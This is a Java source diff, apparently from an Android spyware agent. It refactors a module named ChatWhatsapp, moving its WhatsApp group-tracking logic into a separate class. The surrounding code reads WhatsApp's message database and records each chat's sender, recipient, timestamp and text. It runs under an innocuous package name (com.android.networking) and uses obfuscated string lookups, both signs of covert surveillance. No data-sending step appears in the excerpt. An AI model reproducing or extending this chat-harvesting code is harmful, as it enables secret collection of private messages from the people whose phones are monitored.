@@ -37,7 +37,7 @@ import com.android.networking.util.StringUtils;
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
 
-	final Hashtable<String, String> groups = new Hashtable<String, String>();
+	ChatGroups groups = new ChatWhatsappGroups();
 
 	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
 	private static final int PROGRAM_WHATSAPP = 0x06;
@@ -235,7 +235,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					String conversation = pair.first;
 					int lastReadIndex = pair.second;
 
-					if (isGroup(conversation) && groupTo(conversation) == null) {
+					if (groups.isGroup(conversation) && groups.groupTo(conversation) == null) {
 						fetchGroup(db, conversation);
 					}
 
@@ -289,7 +289,7 @@ public class ChatWhatsapp extends SubModuleChat {
 				String remote = cursor.getString(1);
 				// remotes.add(remote);
 				if (remote != null) {
-					addGroup(conversation, clean(remote));
+					groups.addGroup(conversation, clean(remote));
 				}
 				return id;
 			}
@@ -414,9 +414,9 @@ public class ChatWhatsapp extends SubModuleChat {
 			lastRead = Math.max(index, lastRead);
 
 			if (StringUtils.isEmpty(message)) {
-				if (isGroup(conversation) && !StringUtils.isEmpty(remote)) {
+				if (groups.isGroup(conversation) && !StringUtils.isEmpty(remote)) {
 					if (Cfg.DEBUG) {
-						Check.asserts(groupTo(conversation).contains(remote), "no remote in group: " + remote);
+						Check.asserts(groups.groupTo(conversation).contains(remote), "no remote in group: " + remote);
 					}
 				}
 			} else {
@@ -427,11 +427,11 @@ public class ChatWhatsapp extends SubModuleChat {
 				String from = incoming ? peer : myPhoneNumber;
 				String to = incoming ? myPhoneNumber : peer;
 
-				if (isGroup(peer)) {
+				if (groups.isGroup(peer)) {
 					if (incoming) {
 						from = remote;
 					} else {
-						to = groupTo(peer);
+						to = groups.groupTo(peer);
 					}
 				}
 				messages.add(new MessageChat(PROGRAM_WHATSAPP, new Date(timestamp), from, to, message, incoming));
@@ -451,32 +451,5 @@ public class ChatWhatsapp extends SubModuleChat {
 		return remote.replaceAll(Messages.getString("f_9"), "");
 	}
 
-	private String groupTo(String peer) {
-		return groups.get(peer);
-	}
-
-	private void addGroup(String peer, String remote) {
-		if (Cfg.DEBUG) {
-			Check.requires(isGroup(peer), "peer is not a group: " + peer);
-			Check.log("Adding group " + peer + " : " + remote);
-		}
-		String value;
-		if (groups.containsKey(peer)) {
-			value = groups.get(peer);
-			if (!value.contains(remote)) {
-				value += "," + remote;
-			}
-
-		} else {
-			value = remote;
-		}
-
-		groups.put(peer, value);
-	}
-
-	private boolean isGroup(String peer) {
-
-		return peer.contains("@g.");
-	}
 
 }
